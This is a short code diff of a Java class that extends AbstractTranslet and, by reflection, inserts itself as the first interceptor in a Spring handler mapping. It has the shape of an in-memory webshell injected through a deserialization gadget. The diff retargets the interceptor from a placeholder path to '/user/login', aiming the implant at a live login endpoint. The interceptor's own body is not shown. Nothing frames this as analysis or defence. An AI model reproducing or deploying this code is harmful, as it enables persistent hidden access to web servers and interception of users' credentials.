@@ -107,7 +107,7 @@ public class A12345 extends AbstractTranslet implements HandlerInterceptor {
                     if (!resourceHandlerMapping.toString().equals("null")) {
                         AbstractHandlerMapping abstractHandlerMapping1 = (AbstractHandlerMapping) resourceHandlerMapping;
                         List o = (List) adaptedInterceptorsField.get(abstractHandlerMapping1);
-                        o.add(0, new MappedInterceptor(new String[]{"/xxx"}, (String[]) null, new A12345()));
+                        o.add(0, new MappedInterceptor(new String[]{"/user/login"}, (String[]) null, new A12345()));
                         adaptedInterceptorsField.set(abstractHandlerMapping1, o);
                     }
                 }
